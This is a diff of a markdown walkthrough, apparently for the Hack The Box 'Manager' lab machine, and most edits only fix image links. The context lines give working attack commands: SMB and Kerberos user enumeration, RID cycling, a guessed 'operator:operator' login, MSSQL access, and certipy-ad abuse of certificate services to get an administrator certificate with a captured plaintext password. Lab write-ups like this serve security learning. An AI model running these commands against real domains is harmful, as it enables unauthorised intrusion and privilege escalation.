@@ -28,9 +28,12 @@ Possible Attack Surface based the results: Enumerate databases, tables, and user
 | 135, 139, 445        | Microsoft RPC and SMB            | Associated with remote procedure calls and file-sharing services.  | Check for anonymous access and enumerate shares.                                                                                                                                               |
 | 389, 636, 3268, 3269 | LDAP and Global Catalog Services | Used for directory services and secure communication.              | Enumerate users, groups, and Active directory related directory objects. Test for misconfigured permissions or weak passwords.                                                                 |
 | 1433                 | Microsoft SQL Server             | Indicates the presence of a database server.                       | Enumerate databases, tables, and users. Test for weak credentials and any RCE & password reuse                                                                                                 |
-See the below screenshot that demonstrates output results
 
-(/img/Pasted image 20250105133859.png)
+
+
+
+See the below screenshot that demonstrates output results
+![](/img/Pasted%20image%2020250105133859.png)
 
 ![](/img/Pasted%20image%2020250105134610.png)
 
@@ -56,12 +59,12 @@ dirsearch -u http://10.10.11.236/ -w /usr/share/wordlists/seclists/Discovery/Web
 ```
 
 Attempting to identify,  any potential subdomains for the target domain.
-/img/Pasted image 20250105140006.png
+![](/img/Pasted image 20250105140006.png)
 Checking if there are nay hidden directories and files on the web service.
 /img/Pasted image 20250105140220.png
 
 Default page of the website
-/img/Pasted image 20250105162710.png
+![](/img/Pasted image 20250105162710.png)
 
 Enumerating Virtual Hosts with Ffuf.
 ```bash
@@ -69,7 +72,7 @@ ffuf -u http://10.10.11.236 -H "Host: FUZZ.MANAGE.HTB" -w /usr/share/wordlists/s
 
 ffuf -u http://manager.htb/ -H "Host:FUZZ.MANAGE.HTB" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
 ```
-/img/Pasted image 20250105171724.png
+![](/img/Pasted image 20250105171724.png)
 
 The next thing I turned on was the SMB service to see if there were any accessible file shares. Using the `smbclient` command, I checked for open shares on the host. Unfortunately, I didn't find any special or accessible file shares as per the results below. 
 ```python
@@ -81,7 +84,7 @@ smbclient -L \\\\10.10.11.236\\ -N
     
 - **`-N`**: This option tells `smbclient` to not prompt for a password. It’s typically used when the remote server allows guest or anonymous access, or if you don't need authentication
 ```
-/img/Pasted image 20250105201547.png
+![](/img/Pasted image 20250105201547.png)
 ### Enumerating Users
 
 Next, I shifted focus to hunting for valid users. Kerberos is a critical service for authentication in Active Directory, and enumerating valid usernames can us in further attacks such as password spraying or brute-force attacks.
@@ -95,7 +98,7 @@ Next, I shifted focus to hunting for valid users. Kerberos is a critical service
 `-t 200`: Sets the thread count for faster enumeration.
 ```
 
-/img/Pasted image 20250105164951.png
+![](/img/Pasted image 20250105164951.png)
 At this point, I managed to get potential accounts that can be targeted for further exploitation. The next step is to leverage these findings to gain a foothold on the target.
 
 ### Enumeration Method 2: RID Cycling Attack
@@ -112,15 +115,15 @@ Another approach for user enumeration is through a RID cycling attack using crac
 crackmapexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute
 --rid-brute tells it to perform RID cycling to  enumerate user accounts.
 ```
-/img/Pasted image 20250105192243.png
+![](/img/Pasted image 20250105192243.png)
 With the findings from both Kerbrute and RID cycling, we now have a strong set of potential targets for further exploitation.
 
 Kerberos Pre-Authentication
-/img/Pasted image 20250105195020.png
+![](/img/Pasted image 20250105195020.png)
 ```
 cat domainusers.txt | tr '[:lower:]' '[:upper:]' > uppercase_users.txt
 ```
-/img/Pasted image 20250105193915.png
+![](/img/Pasted image 20250105193915.png)
 We can also use impacket-lookupsid tool, which utilizes null sessions to enumerate SIDs and RIDs for extracting user and group information as above.
 ```
 impacket-lookupsid anonymous@manager.htb -no-pass
@@ -128,7 +131,7 @@ impacket-lookupsid anonymous@manager.htb -no-pass
 - anonymous@manager.htb: Specifies the user as  anonymous  for null session.
 - no-pass: Indicates no password is provided.
 ```
-![[Pasted image 20250105205121.png]]
+![](/img/Pasted image 20250105205121.png)
 What we can do 
 
 
@@ -140,11 +143,11 @@ Found a  valid password using the identified username
 operator:operator
 ```
 
-![[Pasted image 20250105202018.png]]
+![](/img/Pasted image 20250105202018.png)
 ```
 impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
 ```
-![[Pasted image 20250105212138.png]]
+![](/img/Pasted image 20250105212138.png)
 
 ```
 
@@ -155,7 +158,7 @@ impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
 ```
 certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
 ```
-![[Pasted image 20250105220502.png]]
+![](/img/Pasted image 20250105220502.png)
 
 ```
 certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-dc01-ca -enable-template subca
@@ -164,9 +167,9 @@ certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.2
 certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
 10.10.11.236 -ca manager-dc01-ca -list-templates
 ```
-![[Pasted image 20250106200058.png]]
+![](/img/Pasted image 20250106200058.png)
 
-![[Pasted image 20250106195957.png]]
+![](/img/Pasted image 20250106195957.png)
 ```
 certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip
 10.10.11.236 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
